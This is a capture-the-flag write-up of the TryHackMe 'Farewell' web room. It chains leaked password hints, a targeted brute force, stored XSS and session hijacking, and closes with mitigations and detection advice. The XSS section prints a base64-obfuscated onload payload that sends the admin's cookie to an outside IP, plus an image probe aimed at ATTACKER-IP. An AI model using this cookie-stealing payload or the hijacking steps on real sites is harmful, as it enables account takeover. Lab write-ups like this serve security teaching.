# Farewell - TryHackMe Writeup

## Basic Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Machine Name | Farewell |
| Difficulty | Medium |
| Operating System | Linux |
| Category | Web Exploitation (Information Disclosure, Password Brute Force, Stored XSS, Session Hijacking) |

---

# Introduction

Today we are solving another **TryHackMe Medium** machine named **Farewell**.

Unlike traditional Linux machines that require gaining a reverse shell followed by privilege escalation, this room focuses entirely on **web application exploitation**. Throughout the assessment we chain together multiple web vulnerabilities including **information disclosure**, **weak password hints**, **password brute forcing**, **Stored Cross-Site Scripting (Stored XSS)**, and **session hijacking** to compromise both a normal user account and ultimately the administrator account.

The machine demonstrates how seemingly harmless information leaks can become critical when combined with insecure authentication and improper session management.

---

# Scenario

The room provides the following scenario:

> The farewell server will be decommissioned in less than 24 hours. Everyone is asked to leave one last message, but the admin panel holds all submissions. Can you sneak into the admin area and read every farewell message before the lights go out?

---

# Objectives

During this assessment we aim to:

- Enumerate exposed services.
- Discover hidden application endpoints.
- Identify information disclosure vulnerabilities.
- Enumerate valid usernames.
- Recover user credentials.
- Gain authenticated access.
- Test user-controlled inputs.
- Exploit Stored Cross-Site Scripting.
- Steal the administrator session.
- Access the administrator panel.

---

# Attack Methodology

The complete attack chain followed during this assessment is shown below.

```
Reconnaissance
        │
        ▼
Directory Enumeration
        │
        ▼
Information Disclosure
        │
        ▼
Username Enumeration
        │
        ▼
Password Hint Analysis
        │
        ▼
Password Brute Force
        │
        ▼
User Access
        │
        ▼
Stored XSS
        │
        ▼
Cookie Theft
        │
        ▼
Session Hijacking
        │
        ▼
Administrator Access
```

---

# Initial Reconnaissance

The provided target IP is:

```
10.49.151.194
```

The first step is identifying all exposed services.

A full TCP scan is performed.

```bash
nmap -p- 10.49.151.194
```

Results:

```
22/tcp

80/tcp
```

Only SSH and HTTP are externally exposed.

Since no credentials are available for SSH, the attack surface is primarily the web application.

---

# Service Enumeration

A service detection scan provides additional information.

```bash
nmap -sC -sV 10.49.151.194
```

Results:

```
22/tcp

OpenSSH 9.6

80/tcp

Apache 2.4.58
```

Additional observations include:

- Ubuntu Linux
- Apache 2.4.58
- PHP Sessions
- HttpOnly flag missing

One important finding is:

```
PHPSESSID

HttpOnly

Not Set
```

This does not immediately expose the application, but if a Cross-Site Scripting vulnerability exists later, JavaScript will be able to access authentication cookies.

---

# Directory Enumeration

The next phase is enumerating hidden files and directories.

Example:

```bash
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Interesting results include:

```
info.php

admin.php

auth.php

dashboard.php

status.php
```

Several responses immediately stand out.

```
admin.php

403 Forbidden
```

```
dashboard.php

302 Redirect
```

```
auth.php

403 Forbidden
```

Although direct access is denied, these files clearly exist.

This often indicates authentication or authorization controls rather than missing resources.

---

# Investigating auth.php

Instead of ignoring the endpoint because of the HTTP 403 response, additional testing is performed.

Unexpectedly, the endpoint leaks valuable information regarding existing users.

Several usernames become visible.

```
adam

deliver11

nora
```

Each user also has associated metadata.

---

# Username Enumeration

The application exposes the following information.

```
deliver11

Last Password Change

2025-09-10

Password Hint

Capital of Japan followed by 4 digits
```

```
nora

Lucky number 789
```

```
adam

Favorite pet + 2
```

This represents a serious **Information Disclosure** vulnerability.

Password hints intended for legitimate users are directly accessible without authentication.

---

# Why Password Hints Matter

Although passwords themselves are not exposed, hints significantly reduce password entropy.

Instead of brute forcing millions of combinations, an attacker can construct a very small targeted wordlist.

For example:

```
Capital of Japan

↓

Tokyo

↓

Tokyo0000

Tokyo1111

Tokyo2025

Tokyo1010

...
```

This dramatically reduces the search space.

---

# Selecting the Target

Among the available accounts, **deliver11** provides the strongest hint.

```
Capital of Japan

+

4 Digits
```

Unlike the other hints, this suggests a highly predictable password format.

The attack therefore focuses on this account.

---

# Password Brute Force

Instead of attempting a large dictionary attack, a targeted brute-force script is used.

The script generates candidate passwords matching the disclosed pattern.

Example:

```
Tokyo0000

Tokyo1111

Tokyo1234

Tokyo2025

...
```

The automation continues until valid credentials are identified.

---

# Successful Authentication

The brute-force attack successfully discovers the correct password.

```
Tokyo1010
```

Using these credentials grants authenticated access to the application.

This confirms that the leaked password hint directly enabled account compromise.

---

# User Dashboard

After authentication, the user dashboard becomes accessible.

Reviewing the available functionality reveals the ability to submit farewell messages.

Since administrators are expected to review these messages before publication, user-controlled content immediately becomes an interesting attack surface.

---

# User Flag

The authenticated dashboard displays the first flag.

```
THM{USER_ACCESS_1010}
```

At this stage normal user access has been achieved.

The remaining objective is obtaining administrator privileges.

---

# Testing User Input

The farewell message functionality accepts arbitrary HTML.

To determine whether administrators review submissions, a harmless proof-of-concept payload is submitted.

```html
<img src="http://ATTACKER-IP:8000">
```

A simple HTTP server is started.

```bash
python3 -m http.server 8000
```

Shortly afterward, incoming HTTP requests are observed.

```
GET /

GET /

GET /
```

This confirms that another user—most likely the administrator—is automatically viewing submitted messages.

---

# Understanding the Result

The image itself is not important.

The HTTP requests prove two things:

- Administrator interaction exists.
- HTML is rendered without sanitization.

These conditions strongly suggest that **Stored Cross-Site Scripting (Stored XSS)** may be exploitable.

The next phase focuses on replacing the harmless HTML element with JavaScript capable of stealing the administrator's session cookie, hijacking the authenticated session, accessing the administrator panel, and completing the challenge.

# Exploiting Stored Cross-Site Scripting

After confirming that submitted farewell messages are viewed by another user, the next objective is determining whether JavaScript execution is possible.

Unlike the previous HTML image test, the goal now is to execute JavaScript inside the administrator's browser.

If successful, the administrator's authenticated session can potentially be stolen.

---

# Why Stored XSS Works

Stored Cross-Site Scripting occurs when user-controlled input is:

- Stored on the server
- Rendered without sanitization
- Executed inside another user's browser

The execution flow becomes:

```
Attacker

↓

Submit Message

↓

Stored in Database

↓

Administrator Opens Message

↓

JavaScript Executes

↓

Attacker Receives Sensitive Data
```

Since the administrator reviews every farewell message, the vulnerability becomes significantly more impactful.

---

# Crafting the Payload

Instead of simply loading an external image, JavaScript is embedded that forces the administrator's browser to send its session cookie back to our server.

The payload used is:

```html
<body onload="eval(atob('ZmV0Y2goJy8vMTkyLjE2OC4xMzguNi8nK2RvY3VtZW50LmNvb2tpZSk='))">
```

The JavaScript is Base64 encoded to reduce obvious detection while still executing automatically when the page loads.

Its purpose is straightforward:

- Read the administrator's cookies.
- Send them to the attacker's server.
- Allow session hijacking.

---

# Capturing the Administrator Cookie

The attacker-controlled HTTP server continues listening.

```bash
python3 -m http.server 8000
```

Once the administrator views the malicious farewell message, an incoming request is observed.

```
GET /PHPSESSID=3svdvlc54oqqfbg4qq0tcbo91l
```

Although the request results in a 404 response, the objective has already been achieved.

The requested URL itself contains the administrator's session identifier.

---

# Why This Happened

Earlier during reconnaissance, one important finding was:

```
PHPSESSID

HttpOnly

Not Set
```

Normally:

```
document.cookie
```

cannot access session cookies protected by the **HttpOnly** attribute.

Since this protection is absent, JavaScript successfully reads:

```
PHPSESSID
```

and transmits it to the attacker.

This demonstrates why missing HttpOnly protection dramatically increases the impact of Cross-Site Scripting vulnerabilities.

---

# Session Hijacking

The captured session identifier is copied.

Example:

```
PHPSESSID=3svdvlc54oqqfbg4qq0tcbo91l
```

Using browser developer tools or an interception proxy such as Burp Suite, the existing session cookie is replaced with the administrator's session.

The browser now presents itself as the administrator without requiring any credentials.

---

# Accessing the Administrator Panel

After replacing the session cookie, the previously restricted page becomes accessible.

```
/admin.php
```

The application now recognizes the browser as the authenticated administrator.

Administrative functionality becomes fully available.

This successfully bypasses the authentication mechanism without knowing the administrator's username or password.

---

# Administrator Flag

The administrator dashboard reveals the second and final flag.

```
THM{ADMINP@wned007}
```

This confirms complete compromise of the application.

---

# Complete Attack Chain

```
Reconnaissance
        │
        ▼
Nmap Enumeration
        │
        ▼
Directory Enumeration
        │
        ▼
Information Disclosure
        │
        ▼
Username Enumeration
        │
        ▼
Password Hint Analysis
        │
        ▼
Targeted Password Brute Force
        │
        ▼
User Login
        │
        ▼
Stored XSS
        │
        ▼
Administrator Views Message
        │
        ▼
Cookie Theft
        │
        ▼
Session Hijacking
        │
        ▼
Administrator Panel
        │
        ▼
Admin Flag
```

---

# Vulnerabilities Identified

## 1. Information Disclosure

The application exposed usernames along with password hints through an accessible endpoint.

### Impact

- User enumeration
- Reduced password entropy
- Facilitated targeted attacks

### Mitigation

- Never expose password hints publicly.
- Return generic authentication responses.
- Restrict sensitive endpoints to authenticated users only.

---

## 2. Weak Password Policy

Password hints made credentials predictable enough for a focused brute-force attack.

### Impact

- Account compromise
- Credential guessing

### Mitigation

- Enforce strong password policies.
- Eliminate descriptive password hints.
- Enable account lockout or rate limiting.

---

## 3. Stored Cross-Site Scripting (Stored XSS)

User-controlled HTML was stored and rendered without sanitization, allowing arbitrary JavaScript execution in the administrator's browser.

### Impact

- Session theft
- Credential theft
- Administrator account compromise
- Client-side code execution

### Mitigation

- Sanitize and encode all user input.
- Implement a strict Content Security Policy (CSP).
- Validate user-generated content before rendering.

---

## 4. Missing HttpOnly Cookie Protection

The session cookie was accessible through JavaScript because the **HttpOnly** attribute was not enabled.

### Impact

- Cookie theft
- Session hijacking
- Authentication bypass

### Mitigation

- Mark authentication cookies as **HttpOnly**.
- Use the **Secure** attribute for HTTPS deployments.
- Apply **SameSite** where appropriate to reduce cross-site abuse.

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|------------|-----------|
| Active Scanning | T1595 |
| Gather Victim Identity Information | T1589 |
| Brute Force | T1110 |
| Exploit Public-Facing Application | T1190 |
| Steal Web Session Cookie | T1539 |
| Valid Accounts | T1078 |

---

# Detection Opportunities

Security teams should monitor for:

- Repeated failed login attempts against a single account.
- Requests to sensitive endpoints such as `auth.php` and `admin.php`.
- Unexpected HTML or JavaScript in user-submitted messages.
- Outbound requests generated by user content.
- Sudden changes in session identifiers.
- Access to administrator pages from previously unseen sessions.
- Missing security headers and cookie protections.

Web Application Firewalls (WAFs), Content Security Policies, and detailed application logging can significantly improve detection of these attack techniques.

---

# Security Recommendations

To prevent similar compromises:

- Remove publicly accessible password hints.
- Enforce strong password complexity requirements.
- Enable account lockout after repeated failures.
- Sanitize and encode all user-supplied content.
- Implement a restrictive Content Security Policy.
- Mark authentication cookies as **HttpOnly**, **Secure**, and **SameSite**.
- Validate authorization on every privileged endpoint.
- Regularly review web applications for stored XSS vulnerabilities.

---

# Lessons Learned

The **Farewell** room demonstrates how multiple low-to-medium severity issues can be chained together into a complete application compromise. An exposed endpoint leaked usernames and password hints, enabling targeted password guessing. After obtaining legitimate user access, insufficient input validation allowed a Stored Cross-Site Scripting attack, while the absence of the **HttpOnly** cookie attribute enabled session theft. By combining these weaknesses, it was possible to hijack the administrator's session and access privileged functionality without ever knowing the administrator's credentials.

This challenge reinforces the importance of defense in depth. Even if one security control fails, additional protections—such as strong password policies, secure cookie attributes, proper output encoding, and Content Security Policy—can prevent attackers from progressing through the entire attack chain.

---

# Conclusion Jai Shri Ram

**Farewell** is an excellent web-focused TryHackMe room that highlights how seemingly minor security flaws can escalate into a complete compromise when chained together. Beginning with information disclosure and weak password practices, the attack progressed through authenticated access, Stored Cross-Site Scripting, session hijacking, and finally administrator account takeover.

The room provides valuable hands-on experience with realistic web application attack chains while reinforcing secure development practices such as protecting sensitive information, sanitizing user input, and securing session management. It serves as a practical example of why layered defenses are essential for protecting modern web applications.
